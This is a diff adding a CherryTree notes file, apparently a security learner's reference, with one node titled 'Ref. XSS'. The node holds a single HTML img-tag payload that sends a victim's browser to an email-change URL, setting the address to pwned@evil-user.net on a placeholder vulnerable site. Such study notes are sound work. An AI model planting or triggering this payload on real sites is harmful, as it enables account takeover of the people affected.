@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="36" master_id="0" name="Ref. XSS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747569288" ts_lastsave="1747569316">
+    <rich_text>&lt;img src="</rich_text>
+    <rich_text link="webs https://vulnerable-website.com/email/change?email=pwned@evil-user.net">https://vulnerable-website.com/email/change?email=pwned@evil-user.net</rich_text>
+    <rich_text>"&gt;
+</rich_text>
+  </node>
+</cherrytree>
